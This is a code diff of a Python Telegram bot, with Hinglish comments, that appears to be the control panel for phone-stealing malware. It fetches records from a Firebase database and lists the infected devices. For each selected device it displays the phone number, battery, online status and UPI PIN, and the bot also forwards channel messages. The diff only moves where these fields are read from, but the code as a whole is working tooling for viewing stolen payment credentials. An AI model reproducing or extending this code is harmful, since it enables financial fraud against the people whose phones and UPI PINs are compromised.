@@ -125,7 +125,9 @@ async def show_device_page(update, context, page):
         keyboard = []
         msg = "📱 **DEVICES LIST:**\n\n"
         for client_id, info in page_items:
-            name = info.get('d_name', 'Unknown')
+            # Update: info ke andar 'device_info' check karo
+            device_info = info.get('device_info', {})
+            name = device_info.get('d_name', 'Unknown')
             status_icon = "🟢" if info.get('status') == "online" else "🔴"
             msg += f"{status_icon} {name}\n"
             keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"view_{client_id}")])
@@ -155,28 +157,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client_id = query.data.split("_")[1]
         selected_device_id = client_id
         try:
-            base_url = firebase_base.rsplit('/user_data', 1)[0]
-            response = requests.get(f"{base_url}/All_Users/Login/{client_id}.json")
+            response = requests.get(f"{firebase_base}/{client_id}.json")
             details = response.json()
-            
-            if details:
-                d_name = details.get('d_name', 'Unknown')
-                phone = details.get('phoneNumber', 'N/A')
-                battery = details.get('battery', 'N/A')
-                upi_pin = details.get('upi_pin', 'N/A')
-                status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
-                
-                msg = (f"📱 {d_name}\n"
-                       f"🆔 `{client_id}`\n"
-                       f"📞 {phone}\n"
-                       f"🔋 {battery}%\n"
-                       f"📌 UPI Pin: {upi_pin}\n"
-                       f"{status}\n\n"
-                       f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
-            else:
-                msg = "❌ Device ka data nahi mila."
-                
-            await query.edit_message_text(text=msg, parse_mode="Markdown")
+            device_info = details.get('device_info', {})
+            status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
+            msg = (f"📱 {device_info.get('d_name', 'Unknown')}\n"
+                   f"🆔 {client_id}\n"
+                   f"📞 {device_info.get('phoneNumber', 'Unknown')}\n"
+                   f"🔋 {device_info.get('battery', 'N/A')}\n"
+                   f"📌 UPI Pin: {device_info.get('upi_pin', 'N/A')}\n"
+                   f"{status}\n\n"
+                   f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
+            await query.edit_message_text(text=msg)
         except Exception as e:
             await query.edit_message_text(f"Error: {str(e)}")
     elif query.data == "m_cancel":
@@ -290,4 +282,5 @@ if __name__ == '__main__':
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
     app.run_polling()
-        
+    
+                
